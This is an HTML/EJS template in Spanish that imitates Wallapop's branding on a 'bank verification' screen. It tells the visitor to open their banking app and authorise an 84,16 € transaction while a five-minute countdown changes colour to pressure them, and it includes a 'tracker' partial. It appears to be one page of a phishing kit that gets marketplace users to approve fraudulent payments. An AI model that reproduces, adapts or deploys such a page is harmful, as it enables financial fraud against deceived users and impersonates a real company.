<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <%- include('partials/tracker') %>
    <title>Wallapop - Verificación bancaria</title>
    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
    <link rel="stylesheet" href="/css/wallapop.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <style>
        .timer-container {
            margin: 25px 0;
            text-align: center;
            position: relative;
        }
        
        .circle-timer {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto;
        }
        
        .circle-timer svg {
            transform: rotate(-90deg);
            width: 100%;
            height: 100%;
        }
        
        .circle-timer circle {
            fill: none;
            stroke-width: 8;
        }
        
        .circle-timer .bg {
            stroke: #edf1f3;
        }
        
        .circle-timer .progress {
            stroke: var(--wlp-teal, #13c1ac);
            stroke-dasharray: 440;
            stroke-dashoffset: 0;
            transition: stroke 0.5s;
        }
        
        .timer {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 26px;
            font-weight: 700;
            color: #253238;
        }
        
        .timer.warning {
            color: #f57c00;
        }
        
        .timer.danger {
            color: #d01a1a;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
            100% { transform: translate(-50%, -50%) scale(1); }
        }

        .amount-badge {
            font-size: 26px;
            font-weight: 700;
            color: #253238;
            margin: 12px 0;
            display: inline-block;
        }
    </style>
</head>
<body>
    <header class="wlp-header">
        <div class="wlp-header-inner">
            <a href="/" class="wlp-logo-link">
                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
            </a>
        </div>
    </header>

    <main class="wlp-page-wrapper">
        <div class="wlp-modal-card" style="text-align: center;">
            <h1 class="wlp-title" style="margin-bottom: 8px;">Verificación requerida</h1>
            <p style="color: #607d8b; font-size: 14px;">Confirmar pago de compra</p>
            
            <div class="amount-badge">84,16 €</div>
            
            <p style="color: #253238; font-size: 15px; margin: 10px 0 20px; line-height: 1.5;">
                Por favor, abre la aplicación de tu entidad bancaria y autoriza la transacción para completar tu compra en Wallapop.
            </p>
            
            <div class="timer-container">
                <p style="font-size: 13px; color: #78909c; margin-bottom: 12px;">La solicitud caduca en:</p>
                <div class="circle-timer">
                    <svg viewBox="0 0 160 160">
                        <circle class="bg" cx="80" cy="80" r="70"></circle>
                        <circle class="progress" cx="80" cy="80" r="70"></circle>
                    </svg>
                    <div class="timer" id="countdown">5:00</div>
                </div>
            </div>
            
            <p style="font-size: 13px; color: #78909c; line-height: 1.5; margin-top: 15px;">
                Esta pantalla se actualizará automáticamente una vez autorizada la operación en tu banca móvil.
            </p>
        </div>
    </main>
    
    <script>
        function startCountdown() {
            let totalDuration = 5 * 60;
            let duration = totalDuration;
            const timerElement = document.getElementById('countdown');
            const progressCircle = document.querySelector('.circle-timer .progress');
            const circumference = 2 * Math.PI * 70; // ~439.8
            
            progressCircle.style.strokeDasharray = circumference;
            progressCircle.style.strokeDashoffset = 0;

            const timer = setInterval(function() {
                const minutes = Math.floor(duration / 60);
                let seconds = duration % 60;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                timerElement.textContent = minutes + ":" + seconds;
                
                const offset = circumference - (duration / totalDuration) * circumference;
                progressCircle.style.strokeDashoffset = offset;

                if (duration < 60) {
                    progressCircle.style.stroke = '#d01a1a';
                    timerElement.classList.add('danger');
                    timerElement.classList.remove('warning');
                } else if (duration < 120) {
                    progressCircle.style.stroke = '#f57c00';
                    timerElement.classList.add('warning');
                }
                
                duration--;
                
                if (duration < 0) {
                    clearInterval(timer);
                }
            }, 1000);
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            startCountdown();
        });
    </script>
</body>
</html>
